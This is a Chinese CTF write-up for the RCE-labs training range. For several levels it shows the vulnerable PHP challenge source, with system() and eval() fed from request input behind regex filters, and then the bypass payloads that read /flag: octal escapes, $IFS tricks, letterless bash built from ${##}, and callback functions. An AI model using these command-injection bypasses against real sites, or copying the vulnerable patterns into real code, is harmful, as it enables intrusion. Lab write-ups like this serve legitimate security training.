---
title: Chain Mirror Platform 题解
date: 2026-04-02 10:00:00
author: Xendr1a
categories: [CTF题解, Chain Mirror]
tags: [Writeup, RCE]
description: Chain Mirror Platform 靶场 RCE 系列（RCELABS）题解与利用链记录。
toc: true
---
## RCELABS-11

```text
<?php 
/*
# -*- coding: utf-8 -*-
# @Author: 探姬
# @Date:   2024-08-11 14:34
# @Repo:   github.com/ProbiusOfficial/RCE-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - RCE靶场 : 命令执行 - bash终端的无字母命令执行_数字1的特殊变量替换 --- 

题目已经拥有成熟脚本：https://github.com/ProbiusOfficial/bashFuck
你也可以使用在线生成：https://probiusofficial.github.io/bashFuck/
题目本身也提供一个/exp.php方便你使用

本关卡的考点为终端中支持 $((2#binary)) 解析二进制数据 + 我们用 ${##} 来替换 1 

*/

function hello_shell($cmd){
    if(preg_match("/[A-Za-z1-9\"%*+,-.\/:;=>?@[]^`|]/", $cmd)){
        die("WAF!");
    }
    system($cmd);
}

isset($_POST['cmd']) ? hello_shell($_POST['cmd']) : null;

highlight_file(__FILE__);

?>
```

```text
用给的工具直接生成了
cmd=$0<<<$0\<\<\<\$\'\\$(($((${##}<<${##}))#${##}000${##}${##}${##}${##}))\\$(($((${##}<<${##}))#${##}000${##}${##}0${##}))\\$(($((${##}<<${##}))#${##}0${##}00${##}00))\\$(($((${##}<<${##}))#${##}0${##}000))\\$(($((${##}<<${##}))#${##}${##}${##}00${##}))\\$(($((${##}<<${##}))#${##}00${##}00${##}0))\\$(($((${##}<<${##}))#${##}${##}0${##}00))\'
```

## RCELABS-14

```text
<?php 
/*
# -*- coding: utf-8 -*-
# @Author: 探姬
# @Date:   2024-08-11 14:34
# @Repo:   github.com/ProbiusOfficial/RCE-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - RCE靶场 : 命令执行 - 长度限制_7字符RCE --- 

*/

if(strlen($_GET[1]<8)){
    echo strlen($_GET[1]);
    echo '<hr/>';
    echo shell_exec($_GET[1]);
}else{
    exit('too long');
}

highlight_file(__FILE__);

?>
```

```text
7字符串绕过以前遇到过了
?1=cat /f*
?1=nl /*
```

## RCELABS-2

```text
 <?php
include ("get_flag.php");
global $flag;

session_start(); // 开启 session
/*
# -*- coding: utf-8 -*-
# @Author: 探姬
# @Date:   2024-08-11 14:34
# @Repo:   github.com/ProbiusOfficial/RCE-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - RCE靶场 : PHP代码执行函数 --- 

除开在一句话木马中最受欢迎用以直接执行PHP代码的 eval() 函数，PHP还有许多 回调函数 也可以直接或者间接的执行PHP代码。

在该关卡中，你将会从能够执行代码的PHP函数中抽取一个，你需要填充函数的内容来执行某些代码以获取flag（tip:flag存储在 $flag 中,当然你也可以尝试其他方法）。

*/
function hello_ctf($function, $content){
    global $flag;
    $code = $function . "(" . $content . ");";
    echo "Your Code: $code <br>";
    eval($code);
}

function get_fun(){

    $func_list = ['eval','assert','call_user_func','create_function','array_map','call_user_func_array','usort','array_filter','array_reduce','preg_replace'];

    if (!isset($_SESSION['random_func'])) {
        $_SESSION['random_func'] = $func_list[array_rand($func_list)];
    }
    
    $random_func = $_SESSION['random_func'];

    $url_fucn = preg_replace('/_/', '-', $_SESSION['random_func']);
    
    echo "获得新的函数: $random_func ，去 https://www.php.net/manual/zh/function.".$url_fucn.".php 查看函数详情。<br>";

    return $_SESSION['random_func'];
}

function start($act){

    $random_func = get_fun();
    
    if($act == "r"){ /* 通过发送GET ?action=r 的方式可以重置当前选中的函数 —— 或者你可以自己想办法可控它x */
        session_unset();
        session_destroy(); 
    }

    if ($act == "submit"){
        $user_content = $_POST['content']; 
        hello_ctf($random_func, $user_content);
    }
}

isset($_GET['action']) ? start($_GET['action']) : '';

highlight_file(__FILE__);

?>
```

```text
eval()  system("ls");
call_user_func_array()  'system', ['ls']
call_user_func()   'system', 'ls'
```

## RCELABS-6

```text
<?php 
/*
# -*- coding: utf-8 -*-
# @Author: 探姬
# @Date:   2024-08-11 14:34
# @Repo:   github.com/ProbiusOfficial/RCE-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - RCE靶场 : 挑战关 --- 

刚才，学了什么来着！？

*/

function hello_shell($cmd){
    if(preg_match("/[b-zA-Z_@#%^&*:{}\-\+<>\"|`;[]]/", $cmd)){
        die("WAF!");
    }
    system($cmd);
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;

highlight_file(__FILE__);

?>
```

```text
八进制绕过
?cmd=$'\057\142\151\156\057\143\141\164' $'\057\146\154\141\147'
等于 ?cmd=/bin/cat /flag
```

## RCELABS-7

```text
 <?php 
/*
# -*- coding: utf-8 -*-
# @Author: 探姬
# @Date:   2024-08-11 14:34
# @Repo:   github.com/ProbiusOfficial/RCE-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - RCE靶场 : 命令执行 - 终端特殊字符 --- 

在遇到空格被过滤的情况下，通常使用 %09 也就是TAB的URL编码来绕过，在终端环境下 空格 被视为一个命令分隔符，本质上由 $IFS 变量控制，而 $IFS 的默认值是空格、制表符和换行符，所以我们还可以通过直接键入 $IFS 来绕过空格过滤。

*/

function hello_shell($cmd){
    if(preg_match("/flag| /", $cmd)){
        die("WAF!");
    }
    system($cmd);
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;

highlight_file(__FILE__);

?>
```

```text
根据提示绕过
?cmd=cat$IFS/f*
?cmd=cat${IFS}/f*
?cmd=cat%09/f*
```

## RCELABS-8

```text
<?php 
/*
# -*- coding: utf-8 -*-
# @Author: 探姬
# @Date:   2024-08-11 14:34
# @Repo:   github.com/ProbiusOfficial/RCE-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - RCE靶场 : 命令执行 - 重定向 --- 

大多数 UNIX 系统命令从你的终端接受输入并将所产生的输出发送回到您的终端。一个命令通常从一个叫标准输入的地方读取输入，默认情况下，这恰好是你的终端。同样，一个命令通常将其输出写入到标准输出，默认情况下，这也是你的终端 —— 这些是命令有回显的基础。

如果希望执行某个命令，但又不希望在屏幕上显示输出结果，那么可以将输出重定向到 /dev/null：
$ command > /dev/null

/dev/null 是一个特殊的文件，写入到它的内容都会被丢弃；如果尝试从该文件读取内容，那么什么也读不到。但是 /dev/null 文件非常有用，将命令的输出重定向到它，会起到"禁止输出"的效果。
如果希望屏蔽 stdout 和 stderr，可以这样写：
$ command > /dev/null 2>&1

*/

function hello_shell($cmd){
    /*>/dev/null 将不会有任何回显，但会回显错误，加上 2>&1 后连错误也会被屏蔽掉*/
    system($cmd.">/dev/null 2>&1");
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;

highlight_file(__FILE__);

?>
```

```text
用;隔开就行
?cmd=cat /f*;
```

## RCELABS-9

```text
<?php 
/*
# -*- coding: utf-8 -*-
# @Author: 探姬
# @Date:   2024-08-11 14:34
# @Repo:   github.com/ProbiusOfficial/RCE-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - RCE靶场 : 命令执行 - bash终端的无字母命令执行_八进制转义 ---

题目已经拥有成熟脚本：https://github.com/ProbiusOfficial/bashFuck
你也可以使用在线生成：https://probiusofficial.github.io/bashFuck/
题目本身也提供一个/exp.php方便你使用

从该关卡开始你会发现我们在Dockerfile中添加了一行改动：

RUN ln -sf /bin/bash /bin/sh

这是由于在PHP中，system是执行sh的，sh通常只是一个软连接，并不是真的有一个shell叫sh。在debian系操作系统中，sh指向dash；在centos系操作系统中，sh指向bash，我们用的底层镜像 php:7.3-fpm-alpine 默认指向的 /bin/busybox ，要验证这一点，你可以对 /bin/sh 使用 ls -l 命令查看，在这个容器中，你会得到下面的回显：
bash-5.1# ls -l /bin/sh
lrwxrwxrwx    1 root     root            12 Mar 16  2022 /bin/sh -> /bin/busybox

我们需要用到的特性只有bash才支持，请记住这一点，这也是我们手动修改指向的原因。

在这个关卡主要利用的是在终端中，$'\xxx'可以将八进制ascii码解析为字符，仅基于这个特性，我们可以将传入的命令的每一个字符转换为$'\xxx\xxx\xxx\xxx'的形式，但是注意，这种方式在没有空格的情况下无法执行带参数的命令。
比如"ls -l"也就是$'\154\163\40\55\154' 只能拆分为$'\154\163' 空格 $'\55\154'三部分。

bash-5.1# $'\154\163\40\55\154'
bash: ls -l: command not found

bash-5.1# $'\154\163' $'\55\154'
total 4
-rw-r--r--    1 www-data www-data       829 Aug 14 19:39 index.php

*/

function hello_shell($cmd){
    if(preg_match("/[A-Za-z\"%*+,-.\/:;=>?@[]^`|]/", $cmd)){
        die("WAF!");
    }
    system($cmd);
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;

highlight_file(__FILE__);

?>
```

```text
?cmd=$'\143\141\164'%09$'\57\146\154\141\147'
//注意空格的连接
```
